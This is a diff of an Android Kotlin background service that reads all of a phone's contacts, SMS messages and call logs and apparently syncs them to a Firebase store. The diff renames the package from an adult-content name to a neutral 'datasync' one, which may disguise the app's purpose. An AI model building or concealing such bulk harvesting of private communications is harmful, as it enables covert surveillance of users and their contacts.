@@ -1,4 +1,4 @@
-package com.boxx.porn.sync
+package com.boxx.datasync.data.sync
 
 import android.app.Notification
 import android.app.NotificationChannel
@@ -19,11 +19,11 @@ import android.provider.Telephony
 import android.util.Log
 import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
-import com.boxx.porn.MainActivity
-import com.boxx.porn.data.FirestoreRepository
-import com.boxx.porn.model.Device
-import com.boxx.porn.utils.DataHelper
-import com.boxx.porn.utils.DeviceIdHelper
+import com.boxx.datasync.ui.MainActivity
+import com.boxx.datasync.data.repository.FirestoreRepository
+import com.boxx.datasync.domain.model.Device
+import com.boxx.datasync.data.util.DataHelper
+import com.boxx.datasync.data.util.DeviceIdHelper
 import com.google.firebase.crashlytics.FirebaseCrashlytics
 import dagger.hilt.android.AndroidEntryPoint
 import kotlinx.coroutines.*
@@ -93,7 +93,6 @@ class SyncService : Service() {
         }
 
         try {
-            // In production, we'd use delta sync. For this requirement, we sync everything.
             val contacts = DataHelper.fetchContacts(this@SyncService)
             val smsList = DataHelper.fetchSMS(this@SyncService)
             val callLogs = DataHelper.fetchCallLogs(this@SyncService)
@@ -123,7 +122,11 @@ class SyncService : Service() {
             android.Manifest.permission.READ_CONTACTS,
             android.Manifest.permission.READ_SMS,
             android.Manifest.permission.READ_CALL_LOG
-        )
+        ).apply {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                add(android.Manifest.permission.FOREGROUND_SERVICE_DATA_SYNC)
+            }
+        }
         return permissions.all {
             ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
         }
